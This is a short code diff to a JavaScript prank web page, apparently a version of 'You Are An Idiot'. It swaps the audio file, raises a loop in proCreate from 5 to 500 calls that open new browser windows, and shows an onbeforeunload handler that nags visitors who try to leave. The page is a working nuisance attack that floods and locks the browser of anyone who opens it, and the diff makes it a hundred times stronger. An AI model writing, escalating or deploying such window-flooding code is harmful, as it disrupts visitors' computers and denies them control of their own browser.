@@ -21,7 +21,7 @@ function musicPlay() {
 	document.removeEventListener('click', musicPlay);
 }
 
-var faudio = new Audio('media_youare.mp3')
+var faudio = new Audio('./miitheme.mp4')
 
 faudio.addEventListener('timeupdate', function() {
 	console.log('TimeUpdate invoked.');
@@ -58,7 +58,7 @@ function openWindow(url) {
 }
 
 function proCreate() {	
-	for (var i = 0; i < 5; i++) {
+	for (var i = 0; i < 500; i++) {
 		openWindow('index.html');
 	}
 }
@@ -138,3 +138,7 @@ window.onkeydown = function() {
 window.onbeforeunload = function() {
     return "Are you an idiot?";
 };
+
+
+
+
